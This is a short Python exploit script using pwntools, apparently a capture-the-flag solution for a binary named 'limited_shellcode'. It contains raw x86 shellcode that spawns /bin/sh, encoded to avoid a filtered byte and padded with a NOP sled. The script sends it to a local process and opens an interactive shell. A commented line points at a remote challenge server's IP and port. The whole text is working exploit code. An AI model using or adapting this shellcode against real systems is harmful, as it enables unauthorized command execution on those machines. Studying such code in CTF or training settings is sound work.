from pwn import *

sc = b'\x29\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xB0\x2C\xA5\xCD\x80'+b'\x90'*200
#io = remote('61.28.237.24', 30212)
io = process('./limited_shellcode')

print(io.recv())
pause()
io.send(sc)
io.interactive()
